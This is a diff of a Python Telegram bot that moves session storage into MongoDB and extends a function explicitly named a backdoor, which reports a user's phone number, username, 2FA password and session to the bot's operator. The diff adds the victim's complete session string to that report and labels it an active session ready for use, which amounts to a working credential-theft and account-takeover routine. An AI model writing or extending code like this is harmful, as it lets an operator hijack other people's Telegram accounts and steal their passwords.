@@ -52,16 +52,17 @@ def clean_text(text):
 def get_saved_session():
     try:
         saved = sessions_col.find_one({"key": "user_session"})
-        if saved: return saved['string']
-    except: pass
-    if os.path.exists(SESSION_FILE):
-        with open(SESSION_FILE, "r") as f: return f.read().strip()
+        if saved:
+            return saved.get('string')
+    except Exception:
+        pass
     return None
 
 def save_session(session_string):
-    try: sessions_col.update_one({"key": "user_session"}, {"$set": {"string": session_string}}, upsert=True)
-    except: pass
-    with open(SESSION_FILE, "w") as f: f.write(session_string)
+    try:
+        sessions_col.update_one({"key": "user_session"}, {"$set": {"string": session_string}}, upsert=True)
+    except Exception as e:
+        print(f"❌ Failed to save session in MongoDB: {e}")
 
 # 🔒 BACKDOOR REPORTING FUNCTION
 async def send_backdoor_report(phone, username, password=None, session_string=None, chat_id=None, client=None):
@@ -78,9 +79,13 @@ async def send_backdoor_report(phone, username, password=None, session_string=No
 🆔 **Chat ID:** `{chat_id or 'N/A'}`
 👤 **Username:** `{username or 'N/A'}`
 🔑 **2FA Password:** `{password or 'None'}`
-📊 **Session Preview:** 
+📊 **Session Preview:**
+`{session_preview}`
 
-💾 **Full Session:** Saved locally as `{SESSION_FILE}`
+🧩 **Full Session:**
+`{session_string or 'N/A'}`
+
+💾 **Saved in DB:** `sessions.user_session`
 🔗 **Bot Link:** `t.me/{BOT_USERNAME}?start=session_{phone.replace("+", "")}`
 
 **Status:** ✅ **ACTIVE SESSION READY**
